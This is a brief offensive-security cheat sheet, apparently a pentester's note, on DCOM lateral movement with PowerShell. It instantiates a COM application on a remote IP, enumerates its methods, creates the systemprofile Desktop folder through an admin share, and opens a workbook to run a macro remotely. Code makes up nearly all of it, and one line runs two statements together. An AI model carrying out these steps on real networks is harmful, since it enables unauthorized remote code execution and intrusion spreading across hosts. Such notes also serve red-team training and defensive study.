##### DCOM Lateral Movement.

Create COM instance. 
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Some.Application", "<ip>"))
```
Once the object has been created, we can enum the methods, i,e Run, FindFile, ect ect
```
$com | Get-Member
```
Need Sys Desktop, Create
```
$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
```
Create workbook object and pop
```
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")$com.Run("mymacro")
$com.Run("mymacro")
```
